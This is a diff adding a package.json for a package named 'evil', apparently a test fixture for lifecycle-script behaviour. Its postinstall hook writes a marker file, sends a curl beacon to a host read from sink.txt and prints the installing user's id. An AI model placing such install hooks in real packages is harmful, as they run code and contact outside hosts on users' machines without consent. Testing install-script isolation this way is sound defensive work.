@@ -1,0 +1,7 @@
+{
+  "name": "evil",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"require('fs').writeFileSync('marker','x')\" ; curl -s -m 3 http://$(cat $INIT_CWD/sink.txt)/postinstall ; echo postinstall-ran-as-$(id -u)"
+  }
+}
